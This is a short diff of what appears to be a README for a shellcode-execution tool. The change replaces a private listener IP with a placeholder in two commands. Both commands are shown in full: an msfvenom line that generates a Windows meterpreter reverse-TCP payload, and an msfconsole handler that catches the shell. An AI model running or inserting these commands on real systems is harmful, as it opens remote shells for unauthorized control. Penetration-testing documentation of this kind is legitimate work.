@@ -116,7 +116,7 @@ Shellcode Exec
 =====
 
 ```
-$ ./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=172.16.153.1 -f python
+$ ./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python
 
 No encoder or badchars specified, outputting raw payload
 Payload size: 354 bytes
@@ -160,7 +160,7 @@ $ cat shell.txt
 run the console
 
 ```
- ./msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 172.16.153.1; run"
+ ./msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST x.x.x.x; run"
  ```
  
  
